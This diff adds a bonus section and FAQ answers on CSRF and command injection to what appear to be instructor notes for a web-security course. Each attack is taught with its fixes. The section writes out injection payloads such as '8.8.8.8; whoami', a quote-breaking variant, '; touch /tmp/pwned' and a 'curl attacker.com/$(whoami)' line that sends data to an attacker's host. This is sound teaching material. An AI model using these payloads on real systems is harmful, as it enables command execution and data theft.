@@ -120,6 +120,50 @@ instead of acting on it.
   cryptographically random session IDs, rotate on privilege change, invalidate on logout,
   short lifetimes, `Secure`+`HttpOnly`+`SameSite`.
 
+### Bonus: CSRF and Command Injection
+Not drilled hands-on today (the day is already full) — covered as a concept slide, same
+"untrusted input reached something powerful" pattern as everything else. If a student wants
+hands-on practice, DVWA has a page for each.
+
+**CSRF** — the browser's cookie-autopilot is the whole bug. It has nothing to do with stealing
+a cookie (that's XSS/session-hijacking); it's *using* a cookie the victim's browser will attach
+on its own. Teach it as a difficulty ladder:
+1. **GET-based** — the attack is just a link or `<img src=...>`; if a sensitive action responds
+   to GET, one visited page does it.
+2. **POST-based** — needs an auto-submitting form on the attacker's page
+   (`<form ... onload="this.submit()">`) since a plain link can't POST.
+3. **Chained with XSS** — if the target has a reflected/stored XSS bug, the attacker doesn't
+   even need the victim to visit *their* page — the payload can read the CSRF token off the
+   page itself and forge the request from inside the trusted origin, defeating a token defence
+   that isn't also paired with `SameSite`. This is why CSRF and XSS fixes are complementary,
+   not either/or.
+- **Fix, in order of strength:** `SameSite=Lax` (blocks cross-site cookie attachment for most
+  cases, free, one cookie flag) → anti-CSRF token (a per-session secret the form must echo
+  back, checked server-side) → re-authentication for high-value actions (transfers, password
+  change, email change).
+
+**Command injection** — same bug as SQLi, different sink (a shell, not a database). Teach it as
+the same kind of difficulty ladder as SQLi's login-bypass/UNION/blind progression:
+1. **Separator injection** — `;`, `|`, `&&`, backticks/`$(...)` chain a second command onto the
+   first (`8.8.8.8; whoami`, `8.8.8.8 | whoami`).
+2. **Breaking out of quotes** — if the app wraps input in `"..."`, closing the quote first
+   (`" ; whoami ; "`) is needed before the separator works.
+3. **Environment-variable injection** — some inputs land in an env var rather than an argument;
+   `$IFS` substitutes for a space when the literal space character is filtered.
+4. **Blind command injection** — no output is returned to you; prove it with a **side effect**
+   you can observe out-of-band: `; sleep 5` (timing) or `; touch /tmp/pwned` /
+   `curl attacker.com/$(whoami)` if you have a way to check afterward.
+5. **Filter bypass** — once obvious payloads are blocked, look for what wasn't: a different
+   separator, case variation, encoding, or building the payload from allowed fragments.
+- **Fix:** never hand a string to a shell. Call the library function with an **argument list**
+  and `shell=False` (Python `subprocess.run(["ping","-c","1",host])`) — there's no shell to
+  break out of. If a shell truly can't be avoided, a strict allowlist of characters, not a
+  blocklist.
+
+(This difficulty-ladder structure mirrors how pwn.college's web-security module sequences its
+CSRF and command-injection challenges — useful framing to reuse when writing quiz questions or
+extra practice, even though we don't drill it hands-on today.)
+
 ### #5 SSRF
 - The app takes a URL/host from the user and makes a **server-side** request to it (webhook,
   "import from URL", PDF-from-URL, image proxy, link preview).
@@ -211,3 +255,11 @@ Each student can:
   principle: don't build queries from raw input; use the driver's parameterization.
 - **"Is a WAF pointless then?"** No — it blocks opportunistic scanning and buys time during
   patching. It's a layer. The bug still needs a code fix.
+- **"How is CSRF different from XSS if both end with the attacker acting as the user?"** XSS
+  runs the attacker's code *inside* the trusted origin (it can read anything the page can, incl.
+  the CSRF token). CSRF runs *outside* it and relies purely on the browser auto-attaching
+  cookies to a forged request — it never touches the page's JavaScript context at all.
+- **"Why doesn't `SameSite=Lax` fully solve CSRF?"** It blocks cross-site *cookie* attachment
+  for most request types, but top-level GET navigations are still allowed by `Lax` (for normal
+  links to work), and it does nothing if the attacker's payload runs via XSS from inside your
+  own origin. Defense in depth: `SameSite` + token + re-auth for sensitive actions.
